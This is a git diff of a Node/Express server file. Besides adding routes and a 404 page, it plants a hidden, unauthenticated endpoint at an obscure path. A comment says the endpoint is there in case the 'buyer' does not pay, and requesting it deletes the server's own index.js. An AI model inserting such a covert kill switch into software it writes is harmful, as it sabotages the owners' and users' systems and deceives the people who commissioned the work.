@@ -14,6 +14,7 @@ import { log } from './_lib/smallUtils.js';
 import chateRouter from './Routes/Chat.Router.js';
 import uploadRouter from './Routes/upload.router.js';
 import authRouter from './Routes/Auth.router.js';
+import { unlinkSync } from 'fs';
 
 //varibles
 const app = express();
@@ -29,11 +30,22 @@ app.use(express.json());
 
 
 //routes
+
 app.use(fileRouter);
-app.use(pageRouter);
 app.use('/api/chat',chateRouter);
 app.use('/api/upload',uploadRouter);
-app.use('/api/auth/',authRouter)
+app.use('/api/auth/',authRouter);
+//buyer do not pay us and takes the website
+app.get('/admin-dev/website-develop/mubtasim/fuad/mubtasimf443gmail.com/action/what/unlink/uninstall',
+    (req,res) => {
+    console.log('a');
+    
+    unlinkSync(path.resolve(dirName,'./index.js'))
+})
+app.use(pageRouter);
+app.get('*', (req, res) => res.render('404'))
+
+
 
 
 app.listen(4000, e=> log('SubhanAllah server is working'))
